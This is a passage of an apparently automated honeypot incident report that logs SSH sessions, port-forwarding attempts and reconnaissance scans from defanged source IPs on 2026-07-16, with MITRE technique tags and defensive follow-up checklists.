| `2026-07-16 08:10:45` | `cowrie.login.success` |
| `2026-07-16 08:10:45` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.220.241[.]50` to AbuseIPDB if not already reported
- [ ] Block `60.220.241[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2598de6bac7b

| Field | Detail |
|---|---|
| **Source IP** | `87.225.108[.]138` |
| **First Seen** | 2026-07-16 08:10 |
| **Last Seen** | 2026-07-16 08:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:10:50` | `cowrie.session.connect` |
| `2026-07-16 08:10:51` | `cowrie.client.version` |
| `2026-07-16 08:10:51` | `cowrie.client.kex` |
| `2026-07-16 08:10:53` | `cowrie.login.success` |
| `2026-07-16 08:10:53` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.225.108[.]138` to AbuseIPDB if not already reported
- [ ] Block `87.225.108[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6700543aaaa

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 08:15 |
| **Last Seen** | 2026-07-16 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:15:47` | `cowrie.session.connect` |
| `2026-07-16 08:15:47` | `cowrie.client.version` |
| `2026-07-16 08:15:47` | `cowrie.client.kex` |
| `2026-07-16 08:15:47` | `cowrie.login.success` |
| `2026-07-16 08:15:48` | `cowrie.session.params` |
| `2026-07-16 08:15:48` | `cowrie.command.input` |
| `2026-07-16 08:15:48` | `cowrie.log.closed` |
| `2026-07-16 08:15:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37c80c5c2420

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-16 08:25 |
| **Last Seen** | 2026-07-16 08:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:25:34` | `cowrie.session.connect` |
| `2026-07-16 08:25:35` | `cowrie.client.version` |
| `2026-07-16 08:25:35` | `cowrie.client.kex` |
| `2026-07-16 08:25:37` | `cowrie.login.success` |
| `2026-07-16 08:25:38` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18e7ba5b4685

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]3` |
| **First Seen** | 2026-07-16 08:25 |
| **Last Seen** | 2026-07-16 08:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:25:43` | `cowrie.session.connect` |
| `2026-07-16 08:25:44` | `cowrie.client.version` |
| `2026-07-16 08:25:44` | `cowrie.client.kex` |
| `2026-07-16 08:25:46` | `cowrie.login.success` |
| `2026-07-16 08:25:47` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:25:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b39024ef6949

| Field | Detail |
|---|---|
| **Source IP** | `203.198.173[.]145` |
| **First Seen** | 2026-07-16 08:29 |
| **Last Seen** | 2026-07-16 08:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:29:02` | `cowrie.session.connect` |
| `2026-07-16 08:29:03` | `cowrie.client.version` |
| `2026-07-16 08:29:03` | `cowrie.client.kex` |
| `2026-07-16 08:29:04` | `cowrie.login.success` |
| `2026-07-16 08:29:05` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:29:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.198.173[.]145` to AbuseIPDB if not already reported
- [ ] Block `203.198.173[.]145` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-349171ee200d

| Field | Detail |
|---|---|
| **Source IP** | `92.255.196[.]185` |
| **First Seen** | 2026-07-16 08:29 |
| **Last Seen** | 2026-07-16 08:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:29:10` | `cowrie.session.connect` |
| `2026-07-16 08:29:10` | `cowrie.client.version` |
| `2026-07-16 08:29:10` | `cowrie.client.kex` |
| `2026-07-16 08:29:11` | `cowrie.login.success` |
| `2026-07-16 08:29:11` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.255.196[.]185` to AbuseIPDB if not already reported
- [ ] Block `92.255.196[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aea8979be9f

| Field | Detail |
|---|---|
| **Source IP** | `188.168.86[.]6` |
| **First Seen** | 2026-07-16 08:32 |
| **Last Seen** | 2026-07-16 08:32 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:32:14` | `cowrie.session.connect` |
| `2026-07-16 08:32:15` | `cowrie.client.version` |
| `2026-07-16 08:32:15` | `cowrie.client.kex` |
| `2026-07-16 08:32:17` | `cowrie.login.success` |
| `2026-07-16 08:32:18` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:32:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.168.86[.]6` to AbuseIPDB if not already reported
- [ ] Block `188.168.86[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-defbc582ded8

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-16 08:32 |
| **Last Seen** | 2026-07-16 08:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:32:15` | `cowrie.session.connect` |
| `2026-07-16 08:32:15` | `cowrie.client.version` |
| `2026-07-16 08:32:15` | `cowrie.client.kex` |
| `2026-07-16 08:32:15` | `cowrie.login.success` |
| `2026-07-16 08:32:15` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:32:15` | `cowrie.direct-tcpip.data` |
| `2026-07-16 08:32:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79ba3cc51451

| Field | Detail |
|---|---|
| **Source IP** | `220.246.43[.]172` |
| **First Seen** | 2026-07-16 08:32 |
| **Last Seen** | 2026-07-16 08:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:32:23` | `cowrie.session.connect` |
| `2026-07-16 08:32:24` | `cowrie.client.version` |
| `2026-07-16 08:32:24` | `cowrie.client.kex` |
| `2026-07-16 08:32:27` | `cowrie.login.success` |
| `2026-07-16 08:32:27` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:32:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.246.43[.]172` to AbuseIPDB if not already reported
- [ ] Block `220.246.43[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5801f8f2049c

| Field | Detail |
|---|---|
| **Source IP** | `112.26.101[.]76` |
| **First Seen** | 2026-07-16 08:35 |
| **Last Seen** | 2026-07-16 08:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:35:48` | `cowrie.session.connect` |
| `2026-07-16 08:35:49` | `cowrie.client.version` |
| `2026-07-16 08:35:49` | `cowrie.client.kex` |
| `2026-07-16 08:35:52` | `cowrie.login.success` |
| `2026-07-16 08:35:53` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:35:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.26.101[.]76` to AbuseIPDB if not already reported
- [ ] Block `112.26.101[.]76` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f18f9aef626f

| Field | Detail |
|---|---|
| **Source IP** | `195.158.26[.]59` |
| **First Seen** | 2026-07-16 08:36 |
| **Last Seen** | 2026-07-16 08:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:36:02` | `cowrie.session.connect` |
| `2026-07-16 08:36:03` | `cowrie.client.version` |
| `2026-07-16 08:36:03` | `cowrie.client.kex` |
| `2026-07-16 08:36:04` | `cowrie.login.success` |
| `2026-07-16 08:36:05` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:36:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.158.26[.]59` to AbuseIPDB if not already reported
- [ ] Block `195.158.26[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13c2541c1fbc

| Field | Detail |
|---|---|
| **Source IP** | `60.172.54[.]36` |
| **First Seen** | 2026-07-16 08:41 |
| **Last Seen** | 2026-07-16 08:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:41:29` | `cowrie.session.connect` |
| `2026-07-16 08:41:30` | `cowrie.client.version` |
| `2026-07-16 08:41:30` | `cowrie.client.kex` |
| `2026-07-16 08:41:32` | `cowrie.login.success` |
| `2026-07-16 08:41:33` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:41:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `60.172.54[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44b8c48beb38

| Field | Detail |
|---|---|
| **Source IP** | `103.61.122[.]229` |
| **First Seen** | 2026-07-16 08:44 |
| **Last Seen** | 2026-07-16 08:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:44:40` | `cowrie.session.connect` |
| `2026-07-16 08:44:40` | `cowrie.client.version` |
| `2026-07-16 08:44:41` | `cowrie.client.kex` |
| `2026-07-16 08:44:41` | `cowrie.login.success` |
| `2026-07-16 08:44:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.61.122[.]229` to AbuseIPDB if not already reported
- [ ] Block `103.61.122[.]229` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bb86eb0df6f

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-07-16 08:45 |
| **Last Seen** | 2026-07-16 08:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:45:06` | `cowrie.session.connect` |
| `2026-07-16 08:45:06` | `cowrie.client.version` |
| `2026-07-16 08:45:06` | `cowrie.client.kex` |
| `2026-07-16 08:45:08` | `cowrie.login.success` |
| `2026-07-16 08:45:09` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:45:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f2f700a2227

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]50` |
| **First Seen** | 2026-07-16 08:45 |
| **Last Seen** | 2026-07-16 08:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:45:20` | `cowrie.session.connect` |
| `2026-07-16 08:45:21` | `cowrie.client.version` |
| `2026-07-16 08:45:21` | `cowrie.client.kex` |
| `2026-07-16 08:45:25` | `cowrie.login.success` |
| `2026-07-16 08:45:25` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:45:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]50` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d012943d6c5

| Field | Detail |
|---|---|
| **Source IP** | `34.79.58[.]59` |
| **First Seen** | 2026-07-16 08:46 |
| **Last Seen** | 2026-07-16 08:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:46:19` | `cowrie.session.connect` |
| `2026-07-16 08:46:19` | `cowrie.login.success` |
| `2026-07-16 08:46:19` | `cowrie.session.params` |
| `2026-07-16 08:46:19` | `cowrie.command.input` |
| `2026-07-16 08:46:19` | `cowrie.command.input` |
| `2026-07-16 08:46:19` | `cowrie.command.failed` |
| `2026-07-16 08:46:19` | `cowrie.command.input` |
| `2026-07-16 08:46:19` | `cowrie.log.closed` |
| `2026-07-16 08:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.58[.]59` to AbuseIPDB if not already reported
- [ ] Block `34.79.58[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a40238f02ad9

| Field | Detail |
|---|---|
| **Source IP** | `34.79.58[.]59` |
| **First Seen** | 2026-07-16 08:46 |
| **Last Seen** | 2026-07-16 08:46 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:46:32` | `cowrie.session.connect` |
| `2026-07-16 08:46:32` | `cowrie.login.success` |
| `2026-07-16 08:46:33` | `cowrie.session.params` |
| `2026-07-16 08:46:33` | `cowrie.command.input` |
| `2026-07-16 08:46:33` | `cowrie.command.failed` |
| `2026-07-16 08:46:46` | `cowrie.log.closed` |
| `2026-07-16 08:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.58[.]59` to AbuseIPDB if not already reported
- [ ] Block `34.79.58[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79b79ea5abb9

| Field | Detail |
|---|---|
| **Source IP** | `34.79.58[.]59` |
| **First Seen** | 2026-07-16 08:46 |
| **Last Seen** | 2026-07-16 08:46 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:46:34` | `cowrie.session.connect` |
| `2026-07-16 08:46:34` | `cowrie.login.success` |
| `2026-07-16 08:46:35` | `cowrie.session.params` |
| `2026-07-16 08:46:35` | `cowrie.command.input` |
| `2026-07-16 08:46:46` | `cowrie.log.closed` |
| `2026-07-16 08:46:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.58[.]59` to AbuseIPDB if not already reported
- [ ] Block `34.79.58[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ade8e2af8c63

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-16 08:50 |
| **Last Seen** | 2026-07-16 08:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:50:29` | `cowrie.session.connect` |
| `2026-07-16 08:50:29` | `cowrie.client.version` |
| `2026-07-16 08:50:29` | `cowrie.client.kex` |
| `2026-07-16 08:50:29` | `cowrie.login.success` |
| `2026-07-16 08:50:30` | `cowrie.session.params` |
| `2026-07-16 08:50:30` | `cowrie.command.input` |
| `2026-07-16 08:50:30` | `cowrie.log.closed` |
| `2026-07-16 08:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c10fde93191

| Field | Detail |
|---|---|
| **Source IP** | `93.4.16[.]74` |
| **First Seen** | 2026-07-16 08:54 |
| **Last Seen** | 2026-07-16 08:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-16 08:54:17` | `cowrie.session.connect` |
| `2026-07-16 08:54:18` | `cowrie.client.version` |
| `2026-07-16 08:54:18` | `cowrie.client.kex` |
| `2026-07-16 08:54:18` | `cowrie.login.success` |
| `2026-07-16 08:54:18` | `cowrie.direct-tcpip.request` |
| `2026-07-16 08:54:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.4.16[.]74` to AbuseIPDB if not already reported
- [ ] Block `93.4.16[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.78.42[.]11` | **30** | 2026-07-16 06:49 | 2026-07-16 06:49 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `34.79.58[.]59` | **30** | 2026-07-16 08:45 | 2026-07-16 08:46 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `35.195.153[.]185` | **30** | 2026-07-16 07:42 | 2026-07-16 07:43 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-16 05:08 | 2026-07-16 08:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `50.62.181[.]92` | **5** | 2026-07-16 08:02 | 2026-07-16 08:51 | 2m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]166` | **3** | 2026-07-16 08:42 | 2026-07-16 08:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]152` | **3** | 2026-07-16 06:27 | 2026-07-16 06:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]155` | **3** | 2026-07-16 07:16 | 2026-07-16 07:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]179` | **3** | 2026-07-16 07:37 | 2026-07-16 07:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]137` | **3** | 2026-07-16 05:49 | 2026-07-16 05:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]187` | **3** | 2026-07-16 05:48 | 2026-07-16 05:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]87` | **3** | 2026-07-16 05:49 | 2026-07-16 05:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-16 07:33 | 2026-07-16 07:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-16 05:24 | 2026-07-16 05:24 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-16 06:05 | 2026-07-16 06:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.169.104[.]121` | **2** | 2026-07-16 04:58 | 2026-07-16 04:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-07-16 05:05 | 2026-07-16 05:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `43.228.157[.]121` | **2** | 2026-07-16 05:15 | 2026-07-16 05:15 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]53` | **2** | 2026-07-16 06:08 | 2026-07-16 06:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]61` | **2** | 2026-07-16 05:52 | 2026-07-16 05:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]174` | **2** | 2026-07-16 06:20 | 2026-07-16 06:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.102.49[.]155` | **2** | 2026-07-16 07:52 | 2026-07-16 07:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.47.8[.]188` | 1 | 2026-07-16 06:01 | 2026-07-16 06:01 | 7s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]11` | 1 | 2026-07-16 08:34 | 2026-07-16 08:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-07-16 06:27 | 2026-07-16 06:27 | 10s | 0 | `T1592` | 🟢 LOW |
| `115.211.150[.]50` | 1 | 2026-07-16 07:23 | 2026-07-16 07:23 | 12s | 0 | `T1592` | 🟢 LOW |
| `117.50.182[.]94` | 1 | 2026-07-16 08:03 | 2026-07-16 08:03 | 5s | 0 | `T1592` | 🟢 LOW |
| `118.130.168[.]66` | 1 | 2026-07-16 07:51 | 2026-07-16 07:51 | 1s | 0 | `T1592` | 🟢 LOW |
| `122.186.249[.]6` | 1 | 2026-07-16 08:19 | 2026-07-16 08:19 | 12s | 0 | `T1592` | 🟢 LOW |
| `122.187.226[.]21` | 1 | 2026-07-16 07:16 | 2026-07-16 07:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `122.51.143[.]218` | 1 | 2026-07-16 08:52 | 2026-07-16 08:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.72.150[.]250` | 1 | 2026-07-16 05:29 | 2026-07-16 05:29 | 4s | 0 | `T1592` | 🟢 LOW |
| `171.8.42[.]112` | 1 | 2026-07-16 06:41 | 2026-07-16 06:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.10.144[.]116` | 1 | 2026-07-16 06:55 | 2026-07-16 06:55 | 30s | 0 | `T1592` | 🟢 LOW |
| `183.171.149[.]196` | 1 | 2026-07-16 07:29 | 2026-07-16 07:31 | 120s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]180` | 1 | 2026-07-16 08:22 | 2026-07-16 08:22 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | 1 | 2026-07-16 08:37 | 2026-07-16 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.195.210[.]47` | 1 | 2026-07-16 07:36 | 2026-07-16 07:36 | 1s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]168` | 1 | 2026-07-16 05:09 | 2026-07-16 05:09 | 12s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `206.81.2[.]201` | 1 | 2026-07-16 05:20 | 2026-07-16 05:20 | 37s | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | 1 | 2026-07-16 06:05 | 2026-07-16 06:06 | 35s | 0 | `T1592` | 🟢 LOW |
| `27.155.77[.]43` | 1 | 2026-07-16 06:58 | 2026-07-16 07:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.133.173[.]15` | 1 | 2026-07-16 05:59 | 2026-07-16 05:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-07-16 08:35 | 2026-07-16 08:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-07-16 08:21 | 2026-07-16 08:23 | 120s | 0 | `T1592` | 🟢 LOW |
